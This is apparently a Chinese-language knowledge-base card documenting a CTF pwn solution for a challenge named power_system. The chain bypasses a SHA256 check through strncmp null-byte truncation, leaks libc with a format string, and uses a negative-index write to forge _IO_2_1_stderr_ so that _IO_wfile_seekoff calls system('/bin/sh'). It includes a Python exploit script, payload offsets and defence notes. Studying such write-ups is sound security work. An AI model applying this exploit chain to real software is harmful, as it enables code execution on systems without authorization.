---
id: binary-pwn-format-string-sha256-null-truncate-negative-index-stderr-fsop
title: power_system 链：SHA256 比较被 0x00 截断绕过登录 + 格式串泄 libc，负索引越界写 _IO_2_1_stderr_ 经 _IO_wfile_seekoff 调 system("/bin/sh")
type: scenario
domain: binary
path: binary/pwn/format-string
technique: sha256-null-truncate-format-leak-negative-index-stderr-fsop
tags:
- pwn
- format-string
- sha256
- null-truncation
- negative-index
- fsop
- io-file
- stderr
- wfile-seekoff
- glibc
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V364
  verified_at: '2026-11-09T03:28:16+08:00'
  notes: 已对照原文全文与图11-13核对：sha256_final(v1,s1) 把摘要写回 s1，strncmp(s1,pwd_hash,0x20) 在 pwd_hash 第三字节 0x00 处截断（注释 pwd_hash E850006B2A…），爆破 sha256 前缀 e85000 的脚本与 exp 一致；printf(v4) 格式串泄 libc；adjust 只检查 idx>4，idx=-2 越界写到 stderr；图13 gdb 显示 _IO_wfile_seekoff+1250 处 [stderr+0x98]=stderr+0x70、call [r15+0x20]=system、RDI 指向 /bin/sh，与卡内 +0x90/+0x98 布局一致。未验证点：未运行 exp；2016704/0x4c490 等偏移属题目 libc 环境。dedup 首候选仅自身 exact 命中，无同链重复；dup-scan.json（2026-11-08 19:10）早于建卡且无本卡 pair。无 sources/文章 ID/URL，path 合法。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-sha256-null-truncate-negative-index-stderr-fsop/
draft: false
kb_aliases:
- power_system
- sha256 空字节截断
- 哈希比较 strncmp 截断
- 格式字符串泄 libc
- 负索引越界写 stderr
- _IO_wfile_seekoff 调 system
- _IO_wfile_jumps+0x30
- stderr FSOP
---

## 一句话结论

登录校验把 SHA256 摘要的原始字节交给 `strncmp` 之类函数比较时，摘要里第一个 `0x00` 会把比较截断——本题目标摘要以 `E8 50 00` 开头，因此只需爆破出 SHA256 十六进制前缀为 `e85000` 的口令即可登录；该口令同时是 `printf` 的格式化字符串，可泄 libc。登录后用 `adjust` 的负索引越界写（只检查 `idx > 4`，不拦负数）把 0xE0 字节伪造 `_IO_FILE` 覆盖到 `_IO_2_1_stderr_`，主 vtable 填合法的 `_IO_wfile_jumps + 0x30`；程序 `exit()` 时经 `_IO_flush_all_lockp` 调入 `_IO_wfile_seekoff`，在 `+1250` 处执行 `r15 = [stderr+0x98]`、`call [r15+0x20]`，而这两个槽分别被写成 `stderr+0x70`（内容 `/bin/sh`）与 `system`，于是 `system("/bin/sh")` 拿 shell。

## 原理

- **哈希比较被空字节截断**：程序先 `sha256(s1)` 得到 32 字节摘要，再用 `strncmp(s1, pwd_hash, 0x20)` 一类方式与目标比较。若 `pwd_hash` 是摘要原始字节且其中含 `0x00`（本题前 3 字节为 `E8 50 00`），比较在第三个字节处停止，攻击者只需让口令的 SHA256 前 3 字节为 `E8 50 00`（十六进制 `e85000`）即可通过。爆破脚本在固定格式化串前缀后追加 3 个可打印字节，穷举 0x100 组合找 SHA256 前缀匹配的候选。
- **口令就是格式化字符串**：登录成功后程序执行 `__printf_chk(1LL, v4)`，而 `v4` 是口令经 `strcpy` 复制到的 256 字节栈缓冲。直接让口令以 `-%p-%p-%p-%p` 等占位符开头，就能读栈上残留的 libc 返回地址；exp 从输出中解析某个指针，减去 printf 相关固定偏移（exp 写作 `-2016704 + 0x80`）得到 libc 基址。
- **负索引越界写**：`adjust()` 读取 `idx` 后只检查 `if (idx > 4) reject`，没有检查 `idx < 0`；随后 `v3 = &node1[idx - 1]`，把 size 写到 `v3`，再 `readline((char*)(v3 + 8), 0xE0)`。传入 `idx = -2` 时写入位置落在 `_IO_2_1_stderr_` 上，可覆盖 0xE0 字节的 FILE 结构（`readline` 从 `v3+8` 开始写，正好避开 FILE 头部 8 字节）。
- **伪造 FILE 字段**：exp 的 payload 以 `v3` 为基准设置 `+0x28 = 0xffffffff`（`_IO_write_ptr`）、`+0x30 = 1`（`_IO_write_end`），满足 `_IO_flush_all_lockp` 的窄字符 flush 条件；`+0x70` 写 `"/bin/sh"`，`+0x90` 写 `system`，`+0x98` 写 `_IO_2_1_stderr_+0x70`，`+0xa0` 写 `_IO_2_1_stderr_`，`+0xd8` 写 `_IO_wfile_jumps + 0x30`。
- **为什么走 `_IO_wfile_seekoff`**：`FILE.vtable` 指向 `_IO_wfile_jumps + 0x30` 仍在 `__libc_IO_vtables` 合法区间内，能过 `_IO_vtable_check`；`_IO_OVERFLOW` 取 `vtable + 0x18 = _IO_wfile_jumps + 0x48`，即 `_IO_wfile_seekoff`。在 `_IO_wfile_seekoff+1250` 处，函数把 `[FILE+0x98]` 装入 r15、`rdi = r15`，然后 `call qword ptr [r15+0x20]`——本题 `[FILE+0x98] = stderr+0x70`，`[stderr+0x70+0x20] = [stderr+0x90] = system`，且 rdi 指向 `stderr+0x70` 的 `"/bin/sh"`，等价于直接调用 `system("/bin/sh")`。
- **触发路径**：菜单退出时 `main` 返回或调用 `exit()`，`_IO_cleanup → _IO_flush_all_lockp` 遍历 `_IO_list_all` 链，命中被覆盖的 `_IO_2_1_stderr_`，进入上述 vtable 调用链。
- **为什么需要先泄 libc**：payload 里的 `system`、`_IO_2_1_stderr_`、`_IO_wfile_jumps` 都是 libc 地址；同时负索引写入的目标 `_IO_2_1_stderr_` 也是 libc 地址，没有 libc 基址无法构造。

## 触发条件

- 登录逻辑对 SHA256 原始摘要使用 `strncmp/strcmp` 比较，且目标摘要含早期 `0x00` 字节（或攻击者能让比较提前结束）。
- 登录成功后存在把用户输入当格式化字符串打印的路径（`printf(user_input)`）。
- 菜单写接口存在“只检查上界、不检查负数”的索引，且能越界写一段可控长度到 FILE 结构所在地址。
- 目标 glibc 的 `_IO_2_1_stderr_` 布局与 `_IO_wfile_seekoff` 内部偏移匹配（本题 gdb 实测 `_IO_wfile_seekoff+1250` 的 `[FILE+0x98] → call [P+0x20]` 路径）。
- 程序通过 `exit()`/`main` 返回离开，且 stderr 在覆盖后、退出前不被其他流程消费。
- 已知 libc 基址（格式串泄露）。

## 利用步骤

1. **爆破截断登录**：读取目标摘要前缀（本题 `e85000`），循环 3 字节后缀，找到 `sha256(payload).hexdigest()[:6] == "e85000"` 的口令；口令前缀用 `-%p-%p-%p-%p` 作为格式串。
2. **泄 libc**：登录后读取格式化输出，按 `libc_base = leaked - 2016704 + 0x80`（exp 原式）计算基址；用 `libc.sym['system']`、`libc.sym['_IO_2_1_stderr_']`、`libc.symbols['_IO_wfile_jumps']` 算出 payload 地址。
3. **构造 fake FILE**：按偏移填 `0x28=0xffffffff`、`0x30=1`、`0x70="/bin/sh"`、`0x90=system`、`0x98=stderr+0x70`、`0xa0=stderr`、`0xd8=_IO_wfile_jumps+0x30`，其余补零；去掉前 8 字节后长度不超过 0xE0。
4. **负索引写入**：调用 `adjust(-2, 0, payload[8:])`，覆盖 `_IO_2_1_stderr_`。
5. **触发 FSOP**：选择退出（或让程序走到 `exit`），`_IO_flush_all_lockp` 命中 stderr，经 `_IO_wfile_seekoff` 执行 `system("/bin/sh")`。

## PoC

```python
# 关键部分（偏移按题目 libc；exp 原式）
pwd = None
for i1 in range(0x100):
    for i2 in range(0x100):
        for i3 in range(0x100):
            m = b'-%p-%p-%p-%p' + bytes([i1, i2, i3]).replace(b'\x00', b'')
            if hashlib.sha256(m).hexdigest()[:6] == 'e85000':
                pwd = m
                break

login(pwd)
ru('-0x22-')
libc_base = int(ru('\xc0'), 16) - 2016704 + 0x80
libc.address = libc_base

pay = flat({
    0x00: 0,
    0x28: 0xffffffff,
    0x30: 1,
    0x70: b'/bin/sh',
    0x90: libc.sym['system'],
    0x98: libc.sym['_IO_2_1_stderr_'] + 0x70,
    0xa0: libc.sym['_IO_2_1_stderr_'],
    0xd8: libc.symbols['_IO_wfile_jumps'] + 0x30,
    0xe0: 0
}, filler=b'\x00')

adjust(-2, 0, pay[8:])   # 负索引越界写 stderr
sl('4')                  # 退出触发 FSOP
```

gdb 在 `_IO_wfile_seekoff+1250` 处可观察：`RDI = _IO_2_1_stderr_+112`（指向 `"/bin/sh"`），`R15 = [R13+0x98] = _IO_2_1_stderr_+0x70`，`call qword ptr [r15+0x20]` 命中 `system`。

## 变体与关联

- **FSOP 变体**：主 vtable 也可用 `_IO_wfile_jumps+0x10` 走 `__malloc_assert` 路径（见 [[binary-pwn-heap-house-of-cat-wfile-seekoff-wide-vtable-bypass-vtable-check]]）；标准 House of Apple 2 走 `_IO_wfile_overflow → _IO_wdoallocbuf → wide_vtable+0x68`（见 [[binary-pwn-heap-house-of-apple-2-stderr-fsop]]）。本卡的 `[FILE+0x98] → call [P+0x20]` 是 `_IO_wfile_seekoff` 内另一条可直接调 `system` 的路径，字段约束更少。
- **哈希截断变体**：任何把二进制摘要交给 `strcmp/strncmp` 的实现都可能在首个 `0x00` 处截断；同理 `memcmp` 若长度取自字符串 `strlen` 也会缩短比较。
- **格式串变体**：登录/回显把用户输入直接当格式串，常配合 `%p` 泄栈、`%s` 泄任意地址；参见 [[binary-pwn-format-string-canary-libc-leak-rop-system]]、[[binary-pwn-format-string-freehook-printf-stack-leak]]。
- **边界**：`_IO_wfile_seekoff` 内部偏移随 glibc 版本变化，payload 字段（`+0x98`、`+0x20`）需按目标 libc 重新核对；若 stderr 在退出前被使用会提前崩溃。

## 检测与防御

- **代码审计**：哈希比较不要用 `strcmp/strncmp`，应使用固定长度的 `memcmp` 或常量时间比较；不要把用户输入直接作为 `printf` 的格式串（用 `printf("%s", buf)`）。
- **边界检查**：索引必须同时检查上下界（`idx >= 0 && idx < N`），不要只检查 `idx > N`；负索引常被用于向后越界写全局结构/FILE。
- **加固**：开启 PIE、Full RELRO、FORTIFY；glibc 的 vtable 校验只能拦住非法主 vtable，合法 vtable 内的危险路径（如 `_IO_wfile_seekoff`）仍需靠结构体完整性检查。
- **检测特征**：登录输入含大量 `%p/%s`；`_IO_2_1_stderr_` 被改写；退出时进程在 `_IO_wfile_seekoff` 内调用 `system`。
